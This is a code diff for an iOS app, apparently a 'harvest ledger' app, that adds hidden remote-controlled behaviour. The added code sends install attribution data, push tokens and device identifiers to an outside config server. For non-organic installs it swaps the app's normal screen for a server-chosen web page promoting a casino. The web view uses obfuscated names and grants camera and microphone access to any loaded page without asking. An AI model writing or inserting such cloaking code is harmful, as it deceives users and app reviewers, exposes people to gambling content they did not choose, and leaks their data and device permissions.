@@ -1000,8 +1000,775 @@ struct SettingsView: View {
     }
 }
 
+import SwiftUI
+
+struct NotificationView: View {
+    
+    @Environment(\.verticalSizeClass) var verticalSizeClass
+    @Environment(\.horizontalSizeClass) var horizontalSizeClass
+    @Environment(\.presentationMode) var presentationMode
+    
+    private let lastDeniedKey = "lastNotificationDeniedDate"
+    
+    var isPortrait: Bool {
+        verticalSizeClass == .regular && horizontalSizeClass == .compact
+    }
+    
+    var isLandscape: Bool {
+        verticalSizeClass == .compact && horizontalSizeClass == .regular
+    }
+    
+    var body: some View {
+        VStack {
+            if isPortrait {
+                ZStack {
+                    Image("BGforNotifications")
+                        .resizable()
+                        .ignoresSafeArea()
+                    
+                    VStack(spacing: 30) {
+                        Spacer()
+                        
+                        VStack(spacing: 20) {
+                            Text("ALLOW NOTIFICATIONS ABOUT BONUSES AND PROMOS")
+                                .font(.custom("Inter-Bold", size: 18))
+                                .multilineTextAlignment(.center)
+                                .foregroundStyle(.white)
+                            
+                            Text("Stay tuned with best offers from\nour casino")
+                                .font(.custom("Inter-Italic", size: 15))
+                                .multilineTextAlignment(.center)
+                                .foregroundStyle(.white)
+                        }
+                        .padding(.horizontal, 40)
+                        
+                        VStack(spacing: 10) {
+                            Button(action: {
+                                requestNotificationPermission()
+                            }) {
+                                Image("bonuses")
+                                    .resizable()
+                                    .aspectRatio(contentMode: .fit)
+                                    .frame(width: 350, height: 70)
+                            }
+                            
+                            Button(action:{
+                                saveDeniedDate()
+                                presentationMode.wrappedValue.dismiss()
+                                NotificationCenter.default.post(name: .notificationPermissionResult, object: nil, userInfo: ["granted": true])
+                            }) {
+                                Image("skip")
+                                    .resizable()
+                                    .aspectRatio(contentMode: .fit)
+                                    .frame(width: 320, height: 40)
+                            }
+                        }
+                    }
+                    .padding(.vertical, 20)
+                }
+            } else {
+                ZStack {
+                    Image("BGforNotificationsLandscape")
+                        .resizable()
+                        .ignoresSafeArea()
+                    
+                    VStack {
+                        Spacer()
+                        
+                        HStack {
+                            
+                            VStack(alignment: .leading, spacing: 15) {
+                                Text("ALLOW NOTIFICATIONS ABOUT\nBONUSES AND PROMOS")
+                                    .font(.custom("Inter-Bold", size: 18))
+                                    .foregroundStyle(.white)
+                                
+                                Text("Stay tuned with best offers from our casino")
+                                    .font(.custom("Inter-Italic", size: 16))
+                                    .foregroundStyle(Color.white)
+                            }
+                            
+                            Spacer()
+                            
+                            VStack(spacing: 10) {
+                                Button(action: {
+                                    requestNotificationPermission()
+                                }) {
+                                    Image("bonuses")
+                                        .resizable()
+                                        .frame(width: 260, height: 50)
+                                }
+                                
+                                Button(action:{
+                                    saveDeniedDate()
+                                    presentationMode.wrappedValue.dismiss()
+                                    NotificationCenter.default.post(name: .notificationPermissionResult, object: nil, userInfo: ["granted": true])
+                                }) {
+                                    Image("skip")
+                                        .resizable()
+                                        .frame(width: 240, height: 30)
+                                }
+                            }
+                        }
+                        .padding(.bottom, 10)
+                        .padding(.horizontal)
+                    }
+                }
+            }
+        }
+    }
+    
+    private func requestNotificationPermission() {
+        UNUserNotificationCenter.current().getNotificationSettings { settings in
+            switch settings.authorizationStatus {
+            case .notDetermined:
+                UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .badge, .sound]) { granted, error in
+                    if granted {
+                        DispatchQueue.main.async {
+                            NotificationCenter.default.post(name: .notificationPermissionResult, object: nil, userInfo: ["granted": true])
+                            UIApplication.shared.registerForRemoteNotifications()
+                        }
+                        presentationMode.wrappedValue.dismiss()
+                    } else {
+                        saveDeniedDate()
+                        DispatchQueue.main.async {
+                            NotificationCenter.default.post(name: .notificationPermissionResult, object: nil, userInfo: ["granted": false])
+                        }
+                        presentationMode.wrappedValue.dismiss()
+                    }
+                }
+            case .denied:
+                presentationMode.wrappedValue.dismiss()
+            case .authorized, .provisional, .ephemeral:
+                print("razresheni")
+            @unknown default:
+                break
+            }
+        }
+    }
+    
+    private func saveDeniedDate() {
+        UserDefaults.standard.set(Date(), forKey: lastDeniedKey)
+        print("Saved last denied date: \(Date())")
+    }
+}
+
+
+
+struct URLModel: Identifiable, Equatable {
+    let id = UUID()
+    let urlString: String
+}
+
+struct LoadingView: View {
+    @Environment(\.scenePhase) private var scenePhase
+    @State private var hasCheckedAuthorization = false
+    @State  var url: URLModel? = nil
+    @Environment(\.verticalSizeClass) var verticalSizeClass
+    @Environment(\.horizontalSizeClass) var horizontalSizeClass
+    @State var conversionDataReceived: Bool = false
+    @State var isNotif = false
+    let lastDeniedKey = "lastNotificationDeniedDate"
+    let configExpiresKey = "config_expires"
+    let configUrlKey = "config_url"
+    let configNoMoreRequestsKey = "config_no_more_requests"
+    @State var isMain = false
+    @State  var isRequestingConfig = false
+    @StateObject  var networkMonitor = NetworkMonitor.shared
+    @State var isInet = false
+    @State private var hasHandledConversion = false
+    
+    var isPortrait: Bool {
+        verticalSizeClass == .regular && horizontalSizeClass == .compact
+    }
+    
+    var isLandscape: Bool {
+        verticalSizeClass == .compact && horizontalSizeClass == .regular
+    }
+    @State var urlFromNotification: String? = nil
+    
+    var body: some View {
+        VStack {
+            if isPortrait {
+                ZStack {
+                    Image("loading")
+                        .resizable()
+                        .ignoresSafeArea()
+                    
+                    VStack(spacing: 50) {
+                        Spacer()
+                        
+                        VStack(spacing: 30) {
+                            Spacer()
+                            
+                            ProgressView()
+                                .scaleEffect(3.0)
+                                .padding(.top)
+                                .tint(.white)
+                            
+                            Spacer()
+                        }
+                    }
+                    .padding(.vertical, 20)
+                }
+            } else {
+                ZStack {
+                    Image("BGforNotificationsLandscape")
+                        .resizable()
+                        .ignoresSafeArea()
+                    
+                    VStack(spacing: 30) {
+                        Spacer()
+                        
+                        ProgressView()
+                            .scaleEffect(3.0)
+                            .tint(.white)
+                    }
+                    .padding(.bottom, 20)
+                }
+            }
+        }
+        .onReceive(networkMonitor.$isDisconnected) { disconnected in
+            if disconnected {
+                isInet = true
+            } else {
+            }
+        }
+        .fullScreenCover(item: $url) { item in
+            Egg(urlString: item.urlString)
+                .onReceive(NotificationCenter.default.publisher(for: .openUrlFromNotification)) { notification in
+                    if let userInfo = notification.userInfo,
+                       let url = userInfo["url"] as? String {
+                        urlFromNotification = url
+                    }
+                }
+                .fullScreenCover(isPresented: Binding<Bool>(
+                    get: { urlFromNotification != nil },
+                    set: { newValue in if !newValue { urlFromNotification = nil } }
+                )) {
+                    if let urlToOpen = urlFromNotification {
+                        Egg(urlString: urlToOpen)
+                            .ignoresSafeArea()
+                    } else {
+                    }
+                }
+                .ignoresSafeArea(.keyboard)
+                .ignoresSafeArea()
+        }
+        .onReceive(NotificationCenter.default.publisher(for: .openUrlFromNotification)) { notification in
+            if let userInfo = notification.userInfo,
+               let url = userInfo["url"] as? String {
+                urlFromNotification = url
+            }
+        }
+        .fullScreenCover(isPresented: Binding<Bool>(
+            get: { urlFromNotification != nil },
+            set: { newValue in if !newValue { urlFromNotification = nil } }
+        )) {
+            if let urlToOpen = urlFromNotification {
+                Egg(urlString: urlToOpen)
+                    .ignoresSafeArea()
+            } else {
+            }
+        }
+        .onReceive(NotificationCenter.default.publisher(for: .datraRecieved)) { notification in
+            DispatchQueue.main.async {
+                guard !isInet else { return }
+                if !hasHandledConversion {
+                    let isOrganic = UserDefaults.standard.bool(forKey: "is_organic_conversion")
+                    if isOrganic {
+                        isMain = true
+                    } else {
+                        checknotif()
+                    }
+                    hasHandledConversion = true
+                } else {
+                    print("Conversion event ignored due to recent handling")
+                }
+            }
+        }
+        
+        .onReceive(NotificationCenter.default.publisher(for: .notificationPermissionResult)) { notification in
+            req()
+        }
+        .fullScreenCover(isPresented: $isNotif) {
+            NotificationView()
+        }
+        .fullScreenCover(isPresented: $isMain) {
+            ContentView()
+                .environmentObject(RecordStore())
+        }
+        .fullScreenCover(isPresented: $isInet) {
+            NoInternet()
+        }
+    }
+}
 
 #Preview {
-    ContentView()
-        .environmentObject(RecordStore())
+    LoadingView()
+}
+
+
+import Network
+import Combine
+
+final class NetworkMonitor: ObservableObject {
+    static let shared = NetworkMonitor()
+    
+    @Published private(set) var isDisconnected: Bool = false
+    
+    private let monitor = NWPathMonitor()
+    private let queue = DispatchQueue(label: "NetworkMonitorQueue")
+    
+    private init() {
+        monitor.pathUpdateHandler = { [weak self] path in
+            DispatchQueue.main.async {
+                self?.isDisconnected = (path.status != .satisfied)
+            }
+        }
+        monitor.start(queue: queue)
+    }
+}
+
+import SwiftUI
+
+extension View {
+    func outlineText(color: Color, width: CGFloat) -> some View {
+        modifier(StrokeModifier(strokeSize: width, strokeColor: color))
+    }
+}
+
+struct StrokeModifier: ViewModifier {
+    private let id = UUID()
+    var strokeSize: CGFloat = 1
+    var strokeColor: Color = .blue
+    
+    func body(content: Content) -> some View {
+        content
+            .padding(strokeSize*2)
+            .background (Rectangle()
+                .foregroundStyle(strokeColor)
+                .mask({
+                    outline(context: content)
+                })
+            )}
+    
+    func outline(context:Content) -> some View {
+        Canvas { context, size in
+            context.addFilter(.alphaThreshold(min: 0.01))
+            context.drawLayer { layer in
+                if let text = context.resolveSymbol(id: id) {
+                    layer.draw(text, at: .init(x: size.width/2, y: size.height/2))
+                }
+            }
+        } symbols: {
+            context.tag(id)
+                .blur(radius: strokeSize)
+        }
+    }
+}
+
+extension LoadingView {
+    func checknotif() {
+        UNUserNotificationCenter.current().getNotificationSettings { settings in
+            switch settings.authorizationStatus {
+            case .notDetermined:
+                if again() {
+                    isNotif = true
+                } else {
+                    req()
+                }
+            case .denied:
+                req()
+            case .authorized, .provisional, .ephemeral:
+                req()
+            @unknown default:
+                req()
+            }
+        }
+    }
+    
+    func again() -> Bool {
+        if let lastDenied = UserDefaults.standard.object(forKey: lastDeniedKey) as? Date {
+            let threeDaysAgo = Calendar.current.date(byAdding: .day, value: -3, to: Date())!
+            return lastDenied < threeDaysAgo
+        }
+        return true
+    }
+    
+    func req() {
+        let configNoMoreRequestsKey = "config_no_more_requests"
+        if UserDefaults.standard.bool(forKey: configNoMoreRequestsKey) {
+            print("Config requests are disabled by flag, exiting sendConfigRequest")
+            DispatchQueue.main.async {
+                finishWithou()
+            }
+            return
+        }
+
+        guard let conversionDataJson = UserDefaults.standard.data(forKey: "conversion_data") else {
+            print("Conversion data not found in UserDefaults")
+            DispatchQueue.main.async {
+                UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
+                finishWithou()
+            }
+            return
+        }
+
+        guard var conversionData = (try? JSONSerialization.jsonObject(with: conversionDataJson, options: [])) as? [String: Any] else {
+            print("Failed to deserialize conversion data")
+            DispatchQueue.main.async {
+                UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
+                finishWithou()
+            }
+            return
+        }
+
+        conversionData["push_token"] = UserDefaults.standard.string(forKey: "fcmToken") ?? ""
+        conversionData["af_id"] = UserDefaults.standard.string(forKey: "apps_flyer_id") ?? ""
+        conversionData["bundle_id"] = "com.app.harvestleadgerrsharvest"
+        conversionData["os"] = "iOS"
+        conversionData["store_id"] = "6755046445"
+        conversionData["locale"] = Locale.current.identifier
+        conversionData["firebase_project_id"] = "7953984922"
+
+        do {
+            let jsonData = try JSONSerialization.data(withJSONObject: conversionData, options: [])
+                    let url = URL(string: "https://harrvestledger.com/config.php")!
+            var request = URLRequest(url: url)
+            request.httpMethod = "POST"
+            request.setValue("application/json", forHTTPHeaderField: "Content-Type")
+            request.httpBody = jsonData
+
+            let task = URLSession.shared.dataTask(with: request) { data, response, error in
+                if let error = error {
+                    print("Request error: \(error)")
+                    DispatchQueue.main.async {
+                        UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
+                        finishWithou()
+                    }
+                    return
+                }
+
+                guard let httpResponse = response as? HTTPURLResponse else {
+                    print("Invalid response")
+                    DispatchQueue.main.async {
+                        UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
+                        finishWithou()
+                    }
+                    return
+                }
+
+                guard (200...299).contains(httpResponse.statusCode) else {
+                    print("Server returned status code \(httpResponse.statusCode)")
+                    DispatchQueue.main.async {
+                        UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
+                        finishWithou()
+                    }
+                    return
+                }
+
+                if let data = data {
+                    do {
+                        if let json = try JSONSerialization.jsonObject(with: data, options: []) as? [String: Any] {
+                            print("Config response JSON: \(json)")
+                            DispatchQueue.main.async {
+                                handleResp(json)
+                            }
+                        }
+                    } catch {
+                        print("Failed to parse response JSON: \(error)")
+                        DispatchQueue.main.async {
+                            UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
+                            finishWithou()
+                        }
+                    }
+                }
+            }
+
+            task.resume()
+        } catch {
+            print("Failed to serialize request body: \(error)")
+            DispatchQueue.main.async {
+                UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
+                finishWithou()
+            }
+        }
+    }
+
+    func handleResp(_ jsonResponse: [String: Any]) {
+        if let ok = jsonResponse["ok"] as? Bool, ok,
+           let url = jsonResponse["url"] as? String,
+           let expires = jsonResponse["expires"] as? TimeInterval {
+            UserDefaults.standard.set(url, forKey: configUrlKey)
+            UserDefaults.standard.set(expires, forKey: configExpiresKey)
+            UserDefaults.standard.removeObject(forKey: configNoMoreRequestsKey)
+            UserDefaults.standard.synchronize()
+            
+            guard urlFromNotification == nil else {
+                return
+            }
+            self.url = URLModel(urlString: url)
+            print("Config saved: url = \(url), expires = \(expires)")
+            
+        } else {
+            UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
+            UserDefaults.standard.synchronize()
+            print("No valid config or error received, further requests disabled")
+            finishWithou()
+        }
+    }
+    
+    func finishWithou() {
+        DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
+            isMain = true
+        }
+    }
+}
+
+struct NoInternet: View {
+    @Environment(\.verticalSizeClass) var verticalSizeClass
+    @Environment(\.horizontalSizeClass) var horizontalSizeClass
+ 
+    var isPortrait: Bool {
+        verticalSizeClass == .regular && horizontalSizeClass == .compact
+    }
+    
+    var isLandscape: Bool {
+        verticalSizeClass == .compact && horizontalSizeClass == .regular
+    }
+    
+    
+    var body: some View {
+        VStack {
+            if isPortrait {
+                ZStack {
+                    Image("inet")
+                        .resizable()
+                        .ignoresSafeArea()
+                }
+            } else {
+                ZStack {
+                    Image("BGforNotificationsLandscape")
+                        .resizable()
+                        .ignoresSafeArea()
+                    
+                    VStack(spacing: 30) {
+                        Spacer()
+                        
+                        VStack(spacing: 20) {
+                            Image(.error)
+                                .resizable()
+                                .aspectRatio(contentMode: .fit)
+                                .frame(width: 170, height: 150)
+                        }
+                        .padding(.horizontal, 40)
+                        .padding(.bottom, 10)
+                    }
+                }
+            }
+        }
+    }
+}
+
+import SwiftUI
+import UIKit
+@preconcurrency import WebKit
+
+private var asdqw: String = {
+    WKWebView().value(forKey: "userAgent") as? String ?? ""
+}()
+
+class CreateDetail: UIViewController, WKNavigationDelegate, WKUIDelegate {
+    var czxasd: WKWebView!
+    var newPopupWindow: WKWebView?
+    private var lastRedirectURL: URL?
+    
+    override func viewDidLoad() {
+        super.viewDidLoad()
+        
+    }
+    
+    func showControls() async {
+        let content = UserDefaults.standard.string(forKey: "config_url") ?? ""
+        
+        if !content.isEmpty, let url = URL(string: content) {
+            loadCookie()
+            
+            await MainActor.run {
+                let webConfiguration = WKWebViewConfiguration()
+                webConfiguration.mediaTypesRequiringUserActionForPlayback = []
+                webConfiguration.allowsInlineMediaPlayback = true
+                let source: String = """
+                var meta = document.createElement('meta');
+                meta.name = 'viewport';
+                meta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
+                document.getElementsByTagName('head')[0].appendChild(meta);
+                """
+                let script = WKUserScript(source: source, injectionTime: .atDocumentEnd, forMainFrameOnly: true)
+                webConfiguration.userContentController.addUserScript(script)
+                
+                self.czxasd = WKWebView(frame: .zero, configuration: webConfiguration)
+                self.czxasd.customUserAgent = asdqw
+                self.czxasd.navigationDelegate = self
+                self.czxasd.uiDelegate = self
+                
+                self.czxasd.scrollView.isScrollEnabled = true
+                self.czxasd.scrollView.pinchGestureRecognizer?.isEnabled = false
+                self.czxasd.scrollView.keyboardDismissMode = .interactive
+                self.czxasd.scrollView.minimumZoomScale = 1.0
+                self.czxasd.scrollView.maximumZoomScale = 1.0
+                self.czxasd.allowsBackForwardNavigationGestures = true
+                view.backgroundColor = .black
+                self.view.addSubview(self.czxasd)
+                self.czxasd.translatesAutoresizingMaskIntoConstraints = false
+                NSLayoutConstraint.activate([
+                    self.czxasd.leadingAnchor.constraint(equalTo: self.view.safeAreaLayoutGuide.leadingAnchor),
+                    self.czxasd.trailingAnchor.constraint(equalTo: self.view.safeAreaLayoutGuide.trailingAnchor),
+                    self.czxasd.topAnchor.constraint(equalTo: self.view.safeAreaLayoutGuide.topAnchor),
+                    self.czxasd.bottomAnchor.constraint(equalTo: self.view.safeAreaLayoutGuide.bottomAnchor)
+                ])
+                
+                self.loadInfo(with: url)
+            }
+        }
+    }
+    
+    func loadInfo(with url: URL) {
+        czxasd.load(URLRequest(url: url))
+    }
+    
+    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
+        saveCookie()
+    }
+    
+    func webView(_ webView: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
+        let nsError = error as NSError
+        if nsError.domain == NSURLErrorDomain && nsError.code == NSURLErrorHTTPTooManyRedirects {
+            if let url = lastRedirectURL {
+                webView.load(URLRequest(url: url))
+                return
+            }
+        }
+    }
+    
+    func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction,
+                 decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
+        if let url = navigationAction.request.url, let scheme = url.scheme?.lowercased() {
+            lastRedirectURL = url
+            
+            if scheme != "http" && scheme != "https" {
+                if UIApplication.shared.canOpenURL(url) {
+                    UIApplication.shared.open(url)
+                    if webView.canGoBack {
+                        webView.goBack()
+                    }
+                    
+                    decisionHandler(.cancel)
+                    return
+                }
+            }
+        }
+        decisionHandler(.allow)
+    }
+    
+    func webView(_ webView: WKWebView, decidePolicyFor navigationResponse: WKNavigationResponse,
+                 decisionHandler: @escaping (WKNavigationResponsePolicy) -> Void) {
+        if let response = navigationResponse.response as? HTTPURLResponse {
+            let status = response.statusCode
+            
+            if (300...399).contains(status) {
+                decisionHandler(.allow)
+                return
+            } else if status == 200 {
+                if webView.superview == nil {
+                    view.addSubview(webView)
+                    
+                    webView.translatesAutoresizingMaskIntoConstraints = false
+                    NSLayoutConstraint.activate([
+                        webView.leadingAnchor.constraint(equalTo: view.safeAreaLayoutGuide.leadingAnchor),
+                        webView.trailingAnchor.constraint(equalTo: view.safeAreaLayoutGuide.trailingAnchor),
+                        webView.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor),
+                        webView.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor)
+                    ])
+                }
+                decisionHandler(.allow)
+                return
+            } else if status >= 400 {
+                decisionHandler(.cancel)
+                return
+            }
+        }
+        decisionHandler(.allow)
+    }
+    
+    func loadCookie() {
+        let ud: UserDefaults = UserDefaults.standard
+        let data: Data? = ud.object(forKey: "cookie") as? Data
+        if let cookie = data {
+            do {
+                let datas: NSArray? = try NSKeyedUnarchiver.unarchivedObject(ofClass: NSArray.self, from: cookie)
+                if let cookies = datas {
+                    for c in cookies {
+                        if let cookieObject = c as? HTTPCookie {
+                            HTTPCookieStorage.shared.setCookie(cookieObject)
+                        }
+                    }
+                }
+            } catch {
+                print(error.localizedDescription)
+            }
+        }
+    }
+    
+    func saveCookie() {
+        let cookieJar: HTTPCookieStorage = HTTPCookieStorage.shared
+        if let cookies = cookieJar.cookies {
+            do {
+                let data: Data = try NSKeyedArchiver.archivedData(withRootObject: cookies, requiringSecureCoding: false)
+                let ud: UserDefaults = UserDefaults.standard
+                ud.set(data, forKey: "cookie")
+            } catch {
+                print(error.localizedDescription)
+            }
+        }
+    }
+    
+    @available(iOS 15.0, *)
+    func webView(_ webView: WKWebView, requestMediaCapturePermissionFor origin: WKSecurityOrigin,
+                 initiatedByFrame frame: WKFrameInfo, type: WKMediaCaptureType,
+                 decisionHandler: @escaping (WKPermissionDecision) -> Void) {
+        DispatchQueue.main.async {
+            decisionHandler(.grant)
+        }
+    }
+}
+
+struct Egg: UIViewControllerRepresentable {
+    var urlString: String
+    
+    func makeUIViewController(context: Context) -> CreateDetail {
+        let viewController = CreateDetail()
+        UserDefaults.standard.set(urlString, forKey: "config_url")
+        Task {
+            await viewController.showControls()
+        }
+        return viewController
+    }
+    
+    func updateUIViewController(_ uiViewController: CreateDetail, context: Context) {}
+}
+
+extension CreateDetail {
+    func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration,
+                 for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
+        if navigationAction.targetFrame == nil || !(navigationAction.targetFrame?.isMainFrame ?? false) {
+            webView.load(navigationAction.request)
+        }
+        return nil
+    }
+    
+    func webViewDidClose(_ webView: WKWebView) {
+        webView.removeFromSuperview()
+        newPopupWindow = nil
+    }
 }
